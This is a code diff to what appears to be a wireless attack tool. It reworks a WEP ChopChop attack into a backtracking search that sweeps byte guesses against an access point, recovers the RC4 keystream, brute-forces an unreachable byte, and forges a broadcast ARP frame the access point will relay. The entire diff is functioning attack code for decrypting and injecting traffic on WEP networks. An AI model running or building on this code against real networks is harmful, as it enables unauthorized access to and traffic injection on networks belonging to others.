@@ -39,7 +39,6 @@ from wifit3.engine.models import AccessPoint
 from wifit3.engine.attacks.wep.wep_crypto import (
     arp_request_plaintext,
     chop_last_byte_and_fixup,
-    forge_arp_request,
     icv,
 )
 
@@ -201,61 +200,74 @@ class WepChopChop:
             return cipher
         return None
 
-    # ---- The byte-walk (offline-testable core) ------------------------------
+    # ---- The byte-walk: backtracking DFS over relayed candidates ------------
 
-    async def _recover_keystream(self, cipher: bytes):
-        """Chop ``cipher`` from the end down toward the known 16-byte ARP
-        prefix, recovering the keystream byte at each accepted guess. Returns
-        (ks, gap) — ks with the known prefix filled in, and gap = the list of
-        low positions chopping couldn't reach (the AP's too-short-to-relay
-        wall). gap is [] on a full walk, or None if it stalled before making
-        any progress (a dead seed)."""
+    async def _chop_and_forge(self, cipher: bytes) -> Optional[bytes]:
+        """Recover the keystream by chopping ``cipher`` to the known ARP prefix,
+        then forge + return a broadcast ARP frame the AP relays — or None.
+
+        DFS, NOT a single linear walk: at each step the AP may relay MORE than
+        one byte value (its real behavior — vendor quirk / echo, doesn't matter
+        why). We don't guess which is "real": we try each branch, and a wrong
+        byte produces a corrupt frame whose sub-walk dies fast → we backtrack
+        and try the next. The TRUE path is the only one that reaches the prefix
+        AND yields a forged ARP the AP actually relays. Zero faith required in
+        any "first byte is the right one" heuristic."""
         nknown = len(_KNOWN_ARP16)
         if len(cipher) < nknown + 4:
-            return None, None
-        ks = bytearray(len(cipher))
-        body = bytes(cipher)
-        stall_pos = nknown - 1            # -1 relative to nknown = full walk
-        while len(body) > nknown:
-            if not self._active:
-                return None, None
-            accepted = await self._find_accepted(body)
-            if accepted is None:
-                stall_pos = len(body) - 1     # couldn't recover this position
-                self._log(
-                    f"[yellow]ChopChop: chopping wall at byte {stall_pos}[/yellow] "
-                    f"[dim]({len(body) + 24}B frame too short to relay)[/dim]"
+            return None
+        known_ks = bytes(cipher[i] ^ _KNOWN_ARP16[i] for i in range(nknown))
+        return await self._dfs(bytes(cipher), {}, nknown, known_ks, len(cipher))
+
+    async def _dfs(self, body, ks_map, nknown, known_ks, full_len):
+        """One chop step. ks_map: {position: recovered keystream byte} so far."""
+        if not self._active:
+            return None
+        self._bytes_done = max(self._bytes_done, full_len - len(body))
+        self._maybe_heartbeat()
+        if len(body) <= nknown:
+            # Chopped all the way to the known prefix — forge with the full
+            # keystream and let the AP confirm it (validates the whole path).
+            return await self._forge_and_validate(ks_map, known_ks, full_len, [])
+
+        candidates = await self._find_all_accepted(body)
+        if not candidates:
+            # No byte relayed: either the too-short-to-relay wall (a small,
+            # brute-forceable gap remains) or a dead branch (gap too big).
+            gap = list(range(nknown, len(body)))
+            if 0 < len(gap) <= self._MAX_BRUTE_BYTES:
+                return await self._forge_and_validate(
+                    ks_map, known_ks, full_len, gap
                 )
-                break
-            ks[len(body) - 1] = body[-1] ^ accepted
-            body = chop_last_byte_and_fixup(body, accepted)
-            self._bytes_done += 1
-            self._maybe_heartbeat()
-        for i in range(nknown):
-            ks[i] = cipher[i] ^ _KNOWN_ARP16[i]
-        gap = list(range(nknown, stall_pos + 1))   # unreachable low positions
-        return bytes(ks), gap
+            return None
 
-    async def _find_accepted(self, body: bytes) -> Optional[int]:
-        """Sweep guesses 0..255 and return the FIRST the AP relays (re-confirmed),
-        or None. Re-sweeps once on a clean miss (the correct guess's single send
-        may have been lost).
+        pos = len(body) - 1
+        for cand in candidates:
+            ks_map[pos] = body[-1] ^ cand
+            forged = await self._dfs(
+                chop_last_byte_and_fixup(body, cand),
+                ks_map, nknown, known_ks, full_len,
+            )
+            if forged is not None:
+                return forged
+            del ks_map[pos]               # backtrack: this byte led nowhere
+        return None
 
-        Exactly one byte is mathematically valid per step — the ICV residue is
-        unique (proven exhaustively offline, test_wep_crypto). The AP echoes the
-        one valid frame (sibling BSS / retransmit), which can falsely flag a
-        LATER guess — but echoes bleed forward (the true guess is swept first)
-        and cross-byte echoes are length-rejected, so the FIRST confirmed
-        responder is the true byte. We CONFIRM each hit (re-send; a misattributed
-        echo / timing slip won't repeat) to reject a stray first-hit."""
+    async def _find_all_accepted(self, body: bytes) -> list:
+        """Sweep all 256 guesses; return EVERY byte the AP relays (re-confirmed)
+        — the branch set for the DFS. Re-sweeps once if it found none (a lost
+        send), so a real chopping wall is distinguished from packet loss."""
         for _attempt in range(self._BYTE_RETRIES):
+            responders = []
             for guess in range(256):
                 if not self._active:
-                    return None
+                    return responders
                 shortened = chop_last_byte_and_fixup(body, guess)
                 if await self._oracle(shortened) and await self._confirm(shortened):
-                    return guess
-        return None
+                    responders.append(guess)
+            if responders:
+                return responders
+        return []
 
     async def _confirm(self, shortened: bytes) -> bool:
         """Re-send a relaying guess to confirm it's the true byte, not a
@@ -340,21 +352,17 @@ class WepChopChop:
                     continue
 
                 self._set_state("chopping")
-                ks, gap = await self._recover_keystream(cipher)
-                if not self._active:
-                    return
-                if ks is None or gap is None or len(gap) > self._MAX_BRUTE_BYTES:
-                    # No progress, or the unreachable gap is too big to brute —
-                    # blacklist this seed and try another. Keep retrying (never
-                    # auto-stop), per the locked design.
-                    self._tried.add(self._cur_iv)
-                    continue
-
-                forged = self._forge_full(ks) if not gap \
-                    else await self._brute_force_forge(ks, gap)
+                forged = await self._chop_and_forge(cipher)
                 if not self._active:
                     return
                 if forged is None:
+                    # Every branch dead-ended (AP went quiet, or the wall left
+                    # an un-brute-forceable gap) — blacklist this seed, try
+                    # another. Keep retrying (never auto-stop), per the design.
+                    self._log(
+                        "[yellow]ChopChop: couldn't recover from this seed[/yellow] "
+                        "[dim](trying another)[/dim]"
+                    )
                     self._tried.add(self._cur_iv)
                     continue
                 self._succeed(forged)
@@ -362,46 +370,39 @@ class WepChopChop:
         except asyncio.CancelledError:
             pass
 
-    def _forge_full(self, ks: bytes) -> bytes:
-        """Forge a broadcast ARP from a fully-recovered keystream."""
-        return self._build_frame(forge_arp_request(
-            ks[:40], sender_mac=self.source_mac,
-            sender_ip=self._sender_ip, target_ip=self._target_ip,
-        ))
-
-    async def _brute_force_forge(self, ks: bytes, gap: list):
-        """Chopping couldn't reach the low ``gap`` byte(s) (frame too short).
-        Brute-force them with FULL-length forged ARPs (well above the size
-        wall): vary the gap cipher byte(s) until the AP relays one (valid ICV).
-        Returns the valid forged frame, or None."""
+    async def _forge_and_validate(self, ks_map, known_ks, full_len, gap):
+        """Leaf of the DFS: assemble the keystream (recovered bytes + known
+        prefix), forge a broadcast ARP, and CONFIRM the AP relays it — that
+        relay is what validates the whole recovered path. A ``gap`` (the
+        too-short chopping wall) is brute-forced (vary the gap cipher byte over
+        256 full-length forged ARPs). Returns the relayed forged frame, or None
+        (→ the DFS backtracks)."""
+        nknown = len(known_ks)
+        ks = bytearray(full_len)
+        for pos, val in ks_map.items():
+            ks[pos] = val
+        ks[:nknown] = known_ks
         plain = arp_request_plaintext(
             sender_mac=self.source_mac,
             sender_ip=self._sender_ip, target_ip=self._target_ip,
         )
         full = plain + icv(plain)                          # 40 B known plaintext
         cipher = bytearray(p ^ ks[i] for i, p in enumerate(full))
-        p = gap[0]                                         # _MAX_BRUTE_BYTES == 1
-        self._log(
-            "[green]ChopChop:[/green] [dim]chopping wall hit — brute-forcing "
-            "the last byte (256 forged ARPs)…[/dim]"
-        )
-        # Re-sweep on a clean miss — the single valid candidate's relay/confirm
-        # can be lost (no retry here was the cause of the silent "nada").
+        brute = gap[0] if gap else None                    # _MAX_BRUTE_BYTES == 1
+        if brute is not None:
+            self._log(
+                "[green]ChopChop:[/green] [dim]chopping wall hit — brute-forcing "
+                "the last byte (256 forged ARPs)…[/dim]"
+            )
         for _attempt in range(self._BYTE_RETRIES):
-            for g in range(256):
+            for g in (range(256) if brute is not None else (None,)):
                 if not self._active:
                     return None
-                cipher[p] = g
+                if brute is not None:
+                    cipher[brute] = g
                 cand = bytes(cipher)
                 if await self._oracle(cand) and await self._confirm(cand):
                     return self._build_frame(cand)
-        # Say WHY instead of going silent: still nothing after retries means our
-        # recovered keystream is wrong somewhere, or the AP went quiet.
-        self._log(
-            "[yellow]ChopChop: brute-force found NO relaying byte[/yellow] "
-            "[dim](recovered keystream is off, or the AP went quiet — trying "
-            "another seed)[/dim]"
-        )
         return None
 
     def _succeed(self, forged: bytes) -> None:
